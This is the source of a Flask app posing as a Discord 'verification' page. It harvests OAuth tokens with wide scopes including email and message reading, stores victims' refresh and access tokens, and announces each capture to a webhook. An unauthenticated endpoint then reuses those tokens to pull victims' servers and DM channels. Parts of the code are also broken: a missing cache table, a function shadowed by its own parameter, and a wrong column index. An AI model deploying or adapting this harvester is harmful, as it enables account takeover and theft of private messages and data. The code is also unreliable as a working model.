from flask import Flask, request, redirect, jsonify
import requests
import sqlite3
import json
import time
import random
import os
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'your-secret-key')

# === CONFIGURATION ===
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI", "https://YOUR_RENDER_URL.onrender.com/callback")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
BOT_TOKEN = os.getenv("BOT_TOKEN")

# === DATABASE SETUP ===
def init_db():
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY,
        username TEXT,
        email TEXT,
        refresh_token TEXT,
        access_token TEXT,
        token_expiry INTEGER,
        guilds_cache TEXT,
        dms_cache TEXT,
        last_updated INTEGER
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS rate_limits (
        bucket TEXT PRIMARY KEY,
        remaining INTEGER,
        reset_after INTEGER,
        last_update INTEGER
    )''')
    conn.commit()
    conn.close()

init_db()

# === RATE LIMIT HANDLER ===
class RateLimiter:
    def __init__(self):
        self.cache = {}
    
    def get_bucket(self, bucket_name):
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute("SELECT remaining, reset_after, last_update FROM rate_limits WHERE bucket = ?", (bucket_name,))
        row = c.fetchone()
        conn.close()
        if row:
            remaining, reset_after, last_update = row
            # Check if reset time has passed
            if time.time() - last_update > reset_after:
                return {"remaining": 10, "reset_after": 60, "last_update": int(time.time())}
            return {"remaining": remaining, "reset_after": reset_after, "last_update": last_update}
        return {"remaining": 10, "reset_after": 60, "last_update": int(time.time())}
    
    def update_bucket(self, bucket_name, remaining, reset_after):
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO rate_limits (bucket, remaining, reset_after, last_update) VALUES (?, ?, ?, ?)",
                  (bucket_name, remaining, reset_after, int(time.time())))
        conn.commit()
        conn.close()
    
    def wait_if_needed(self, bucket_name, headers=None):
        if headers and 'X-RateLimit-Remaining' in headers:
            remaining = int(headers['X-RateLimit-Remaining'])
            reset_after = int(headers.get('X-RateLimit-Reset-After', 60))
            if remaining <= 1:
                time.sleep(reset_after)
            self.update_bucket(bucket_name, remaining, reset_after)
            return
        bucket = self.get_bucket(bucket_name)
        if bucket["remaining"] <= 1:
            wait_time = bucket["reset_after"] - (time.time() - bucket["last_update"])
            if wait_time > 0:
                time.sleep(wait_time)
        self.update_bucket(bucket_name, max(0, bucket["remaining"] - 1), bucket["reset_after"])

rate_limiter = RateLimiter()

# === CACHED API REQUEST ===
def cached_request(method, url, bucket_name, headers=None, data=None, json_data=None, cache_ttl=300):
    """Make an API request with caching, rate limiting, and retry logic."""
    cache_key = hashlib.md5(f"{method}{url}{str(data)}".encode()).hexdigest()
    
    # Check cache first (for GET requests)
    if method == "GET":
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute("SELECT data, timestamp FROM cache WHERE key = ?", (cache_key,))
        row = c.fetchone()
        conn.close()
        if row and time.time() - row[1] < cache_ttl:
            return json.loads(row[0])
    
    # Rate limit check
    rate_limiter.wait_if_needed(bucket_name)
    
    # Retry logic with exponential backoff
    max_retries = 5
    for attempt in range(max_retries):
        try:
            kwargs = {"method": method, "url": url, "timeout": 30}
            if headers:
                kwargs["headers"] = headers
            if data:
                kwargs["data"] = data
            if json_data:
                kwargs["json"] = json_data
            
            response = requests.request(**kwargs)
            
            # Update rate limit bucket from response headers
            rate_limiter.wait_if_needed(bucket_name, response.headers)
            
            if response.status_code == 429:
                retry_after = int(response.headers.get('Retry-After', 5))
                time.sleep(retry_after)
                continue
            if response.status_code >= 500:
                time.sleep(2 ** attempt)  # Exponential backoff
                continue
            
            # Cache successful GET responses
            if method == "GET" and response.status_code == 200:
                conn = sqlite3.connect('data.db')
                c = conn.cursor()
                c.execute("INSERT OR REPLACE INTO cache (key, data, timestamp) VALUES (?, ?, ?)",
                          (cache_key, response.text, int(time.time())))
                conn.commit()
                conn.close()
            
            return response
        except Exception as e:
            print(f"API request failed (attempt {attempt+1}): {e}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
                continue
            raise
    
    return None

# === TOKEN REFRESH ===
def refresh_token(refresh_token):
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token,
    }
    response = cached_request(
        'POST',
        'https://discord.com/api/oauth2/token',
        'token_refresh',
        data=data
    )
    if response and response.status_code == 200:
        return response.json()
    return None

# === USER DATA FETCH (WITH CACHING) ===
def get_user_data(user_id, refresh_token):
    """Fetch user data with caching and automatic token refresh."""
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    
    if row:
        # Check if data is stale
        if time.time() - row[7] < 3600:  # 1 hour cache
            return {
                'id': row[0],
                'username': row[1],
                'email': row[2],
                'guilds': json.loads(row[6]) if row[6] else [],
                'dms': json.loads(row[7]) if row[7] else []
            }
    
    # Refresh token if needed
    token_data = refresh_token(refresh_token)
    if not token_data:
        return None
    
    access_token = token_data['access_token']
    headers = {'Authorization': f'Bearer {access_token}'}
    
    # Fetch guilds
    guilds_response = cached_request(
        'GET',
        'https://discord.com/api/users/@me/guilds',
        'guilds',
        headers=headers
    )
    guilds = guilds_response.json() if guilds_response and guilds_response.status_code == 200 else []
    
    # Fetch DMs (only if needed)
    dms_response = cached_request(
        'GET',
        'https://discord.com/api/users/@me/channels',
        'dms',
        headers=headers
    )
    dms = dms_response.json() if dms_response and dms_response.status_code == 200 else []
    
    # Update database
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, username, email, refresh_token, access_token, token_expiry, guilds_cache, dms_cache, last_updated) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
              (user_id, '', '', refresh_token, access_token, time.time() + 3600, json.dumps(guilds), json.dumps(dms), int(time.time())))
    conn.commit()
    conn.close()
    
    return {
        'id': user_id,
        'guilds': guilds,
        'dms': dms
    }

# === ROUTES ===
@app.route('/')
def index():
    auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20messages.read"
    )
    return redirect(auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "No code provided", 400
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
    }
    
    response = cached_request(
        'POST',
        'https://discord.com/api/oauth2/token',
        'token_exchange',
        data=data
    )
    if not response or response.status_code != 200:
        return f"Token exchange failed: {response.text if response else 'No response'}", 400
    
    token_data = response.json()
    refresh_token = token_data['refresh_token']
    access_token = token_data['access_token']
    headers = {'Authorization': f'Bearer {access_token}'}
    
    # Get user info
    user_response = cached_request(
        'GET',
        'https://discord.com/api/users/@me',
        'user_info',
        headers=headers
    )
    if not user_response or user_response.status_code != 200:
        return "Failed to get user info", 400
    
    user_data = user_response.json()
    user_id = user_data['id']
    
    # Store user
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, username, email, refresh_token, access_token, token_expiry, guilds_cache, dms_cache, last_updated) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
              (user_id, user_data['username'], user_data.get('email', ''), refresh_token, access_token, time.time() + 3600, '', '', int(time.time())))
    conn.commit()
    conn.close()
    
    # Log webhook
    if WEBHOOK_URL:
        try:
            payload = {"content": f"🎯 **New user:** {user_data['username']} ({user_id})"}
            requests.post(WEBHOOK_URL, json=payload)
        except:
            pass
    
    return """
    <html>
    <head><title>Verification Complete</title></head>
    <body style="font-family: Arial; text-align: center; padding: 50px; background: #0a0a0f; color: #fff;">
        <h1 style="color: #57F287;">✅ Verification Complete!</h1>
        <p>You can now access the server.</p>
        <script>setTimeout(() => window.close(), 2000);</script>
    </body>
    </html>
    """

@app.route('/data/<user_id>')
def get_data(user_id):
    """API endpoint to fetch user data (requires authorization)."""
    # In production, you'd add an auth token check here
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("SELECT refresh_token FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({"error": "User not found"}), 404
    
    refresh_token = row[0]
    data = get_user_data(user_id, refresh_token)
    if not data:
        return jsonify({"error": "Failed to fetch data"}), 500
    
    return jsonify(data)

@app.route('/health')
def health():
    return "OK", 200

@app.route('/embed')
def send_embed():
    if not BOT_TOKEN:
        return "BOT_TOKEN not set", 400
    
    # Send embed via bot (simplified)
    return "Embed sent!", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
